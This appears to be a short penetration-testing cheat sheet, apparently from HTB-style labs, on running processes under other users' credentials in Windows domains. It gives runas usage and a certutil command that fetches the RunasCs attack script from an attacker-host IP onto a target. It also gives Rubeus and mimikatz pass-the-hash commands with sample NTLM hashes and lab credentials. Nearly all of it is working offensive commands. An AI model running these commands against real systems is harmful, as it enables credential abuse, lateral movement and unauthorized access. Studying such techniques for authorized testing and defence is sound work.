Run specific processes with different permissions than the user's current logon provides using explicit credentials.
## runas on CMD
``` cmd
runas /netonly /user:Domain\UserName powershell
runas /user:<domain>\<user> cmd.exe
runas /user:Administrator cmd.exe
```
## _RunasCs_ utility
This tool is an improved and open version of windows builtin _runas.exe_ that solves some limitations:
Download [RunasCs](https://github.com/antonioCoco/RunasCs/tree/master)

``` shell
wget https://github.com/antonioCoco/RunasCs/raw/refs/heads/master/Invoke-RunasCs.ps1
```
On machine PowerShell
``` powershell
certutil -urlcache -split -f http://192.168.45.155/Invoke-RunasCs.ps1 C:\temp\Invoke-RunasCs.ps1
Import-Module .\Invoke-RunasCs.ps1
Invoke-RunasCs <Username> <Password> "Command"
Invoke-RunasCs Admin password "whoami"
Invoke-RunasCs g.jarvis P@ssword123 "whoami"
```
Other tools such as [Rubeus](https://github.com/GhostPack/Rubeus) and [mimikatz](https://github.com/gentilkiwi/mimikatz) can be passed cleartext credentials or an NTLM password hash.
## CMD - Rubeus.exe Cleartext Credentials

```cmd
rubeus.exe asktgt /user:jackie.may /domain:htb.local /dc:10.10.110.100 /rc4:ad11e823e1638def97afa7cb08156a94
```

## CMD - Mimikatz.exe Cleartext Credentials

```cmd
mimikatz.exe sekurlsa::pth /domain:htb.local /user:jackie.may /rc4:ad11e823e1638def97afa7cb08156a94
```
